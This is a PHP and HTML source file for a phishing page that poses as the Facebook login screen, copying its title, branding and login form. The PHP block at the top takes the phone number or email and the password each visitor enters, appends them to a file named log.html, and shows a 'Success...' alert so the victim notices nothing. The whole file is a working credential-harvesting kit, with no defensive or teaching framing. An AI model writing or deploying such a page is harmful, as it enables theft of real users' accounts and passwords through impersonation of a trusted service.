<?php
function checkk($string) {
    $str = trim(strip_tags(htmlentities(htmlspecialchars($string))));
    return $str;
}

if (isset($_POST['inn'])) {
    $pnum = checkk($_POST['pnum']);
    $pass = checkk($_POST['pass']);

    if (!empty($pnum) && !empty($pass)) {
        $a = file_get_contents('log.html');

        $a .= '<br>Num/Email: '. $pnum.', Password: '. $pass.'<br>';
        file_put_contents('log.html', $a);
        ?><script>alert('Success...');</script><?php
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - log in or sign up</title>

    <style>
        body {
            margin: 0;
            padding: 0;
        }

        .fbx {
            display: -ms-flexbox;
            display: flex;
            -ms-flex-wrap: wrap;
            flex-wrap: wrap;
            margin-right: 15px;
            margin-left: 15px;
        }
        .bx-4 {
            -ms-flex: 0 0 33.33%;
            flex: 0 0 33.33%;
            max-width: 33.33%;
        }

        @media(max-width: 500px) {
            .bx-4 {
                -ms-flex: 0 0 100%;
                flex: 0 0 100%;
                max-width: 100%;
            }
        }

        ul {
            padding: 0;
            margin: 0;
        }

        ul li {
            display: inline-block;
            text-align: left;
            padding: 0;
            margin: 6px;
            width: 45%;
            color: rgb(139, 139, 136);
        }
    </style>
</head>
<body>
    <div style="background-color: blue; color: white; padding: 8px; font-size: 20px; font-weight: bold;">facebook</div><br>

    <form method="POST" action="">
        <div class="fbx">
            <div class="bx-4"></div>
            <div class="bx-4">
                <label for="pn">Phone number or email address</label>
                <input type="text" name="pnum" id="pn" style="width: 100%; height: 40px;" required><br><br>

                <label for="pass">Password</label>
                <input type="password" name="pass" id="pass" style="width: 100%; height: 40px;" required><br><br>

                <input type="submit" value="Log In" name="inn" style="background-color: blue; color: white; border: none; width: 100%; height: 30px;"><br><br>

                <div style="position: relative; width: 100%;">
                    <div style="border-bottom: 1px solid black; width: 40%; position: absolute; top: 50%; left: 0;"></div>

                    <div style="text-align: center;"> or </div>
                    
                    <div style="border-bottom: 1px solid black; width: 40%; position: absolute; top: 50%; right: 0;"></div>
                </div><br>

                <input type="button" value="Create New Account" style="background-color: chartreuse; color: white; border: none; width: 60%; height: 30px; display: block; margin: auto;"><br>

                <a href="" style="color: blue; text-decoration: none; width: 60%; display: block; margin: auto; text-align: center;">Forgotten password?</a><br>
            </div>
        </div>
    </form>

    <div style="padding: 15px; background-color: black;">
        <ul>
            <li>English (UK)</li>
            <li>Hausa</li>
            <li>Portugues (Brasil)</li>
            <li>Francais (France)</li>
            <li>Espanol</li>
            <li><span style="padding: 3px 5px; border: 1px solid rgb(139, 139, 136);">+</span></li>
            <li style="color: white;">Facebook Inc.</li>
        </ul>
    </div>
</body>
</html>